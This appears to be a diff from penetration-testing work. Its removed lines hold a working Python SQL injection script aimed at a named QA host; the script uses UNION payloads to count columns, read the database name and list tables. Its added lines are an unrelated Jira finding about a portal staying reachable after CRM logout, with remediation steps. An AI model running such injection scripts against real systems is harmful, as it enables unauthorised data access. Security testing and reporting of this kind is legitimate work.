@@ -1,93 +1,35 @@
-```python
-import requests
-import re
+Jira Title:
+CDNmn Portal Accessible After CRM Logout (Authentication Not Enforced)
 
-# Base URL for the smallurl service
-base_url = "https://crmqa.xrm.com/create.jsp"
+🔹 Description:
+The CDNmn portal remains accessible even after the user logs out of the CRM.
 
-# Function to send a request with a potential SQL injection payload
-def send_request(payload):
-    print(f"Step: Sending request with payload: {payload}")
-    params = {"url": payload}
-    try:
-        response = requests.get(base_url, params=params)
-        response.raise_for_status()
-        print("Step: Request successful. Received response.")
-        return response.text
-    except requests.exceptions.RequestException as e:
-        print(f"Step: Request failed with error: {str(e)}")
-        return str(e)
+Expected behavior: Logging out of the CRM should terminate the session and revoke access to all integrated portals, including CDNmn.
 
-# Function to determine the number of columns for union injection
-def find_column_count():
-    print("Step: Starting to find the number of columns for union-based injection.")
-    for col_count in range(1, 20):  # Increased range for safety
-        union_payload = f"' UNION SELECT {'NULL,' * (col_count - 1)}'injected' -- "
-        response = send_request(union_payload)
-        if "injected" in response:
-            print(f"Step: Union injection successful with {col_count} columns.")
-            return col_count
-    print("Step: Could not determine the number of columns for union injection.")
-    return None
+Actual behavior: The CDNmn portal can still be accessed post-logout, indicating that session authentication and invalidation are not being enforced properly.
 
-# Function to extract the current database name
-def extract_database_name(col_count):
-    if col_count is None:
-        return None
-    print("Step: Attempting to extract the current database name.")
-    # Replace the last NULL with DATABASE()
-    db_payload = f"' UNION SELECT {'NULL,' * (col_count - 1)}DATABASE() -- "
-    response = send_request(db_payload)
-    
-    # Attempt to extract the database name from the response
-    # Assuming it appears in the output; adjust regex if needed based on response format
-    match = re.search(r'\b\w+\b', response)  # Naive extraction; improve based on actual output
-    if match:
-        db_name = match.group(0)
-        print(f"Step: Extracted database name: {db_name}")
-        return db_name
-    else:
-        print("Step: Could not extract database name from response.")
-        return None
+This exposes authenticated resources to unauthorized access and poses a security risk.
 
-# Function to extract table names from information_schema.tables
-def extract_table_names(col_count):
-    if col_count is None:
-        return []
-    print("Step: Attempting to extract table names from information_schema.tables.")
-    # Replace the last NULL with table_name FROM information_schema.tables
-    table_payload = f"' UNION SELECT {'NULL,' * (col_count - 1)}table_name FROM information_schema.tables -- "
-    response = send_request(table_payload)
-    
-    # Attempt to parse table names from response
-    # This is simplistic; assumes table names are words in the response
-    tables = re.findall(r'\b\w+\b', response)
-    print(f"Step: Potential table names extracted: {tables}")
-    return tables
 
-# Main execution
-if __name__ == "__main__":
-    print("Starting SQL injection test script...")
-    
-    col_count = find_column_count()
-    
-    db_name = extract_database_name(col_count)
-    if db_name:
-        print(f"\nExtracted Database Name: {db_name}")
-    
-    tables = extract_table_names(col_count)
-    if tables:
-        print("\nExtracted Table Names:")
-        for table in tables:
-            print(table)
-        
-        # Check specifically for 'urlmapping'
-        if 'urlmapping' in tables:
-            print("\nStep: Table 'urlmapping' found in the list.")
-        else:
-            print("\nStep: Table 'urlmapping' not found in the extracted list.")
-    else:
-        print("\nNo table names extracted.")
-    
-    print("\nScript execution completed.")
-```
+🔹 Impact (CVSS 4.0 – Medium Severity):
+
+Users retain unintended access to CDNmn after CRM logout.
+
+Increases risk of session hijacking, data leakage, and misuse of portal resources.
+
+Violates secure session management principles (e.g., OWASP A07:2021 – Identification and Authentication Failures).
+
+
+🔹 Remediation:
+
+1. Enforce session validation for CDNmn portal requests.
+
+
+2. Ensure logout from CRM propagates to all integrated services, invalidating associated tokens/sessions.
+
+
+3. Implement centralized session management to prevent reuse of stale sessions.
+
+
+4. Conduct regular testing of authentication flows to confirm that session termination works as intended.
+
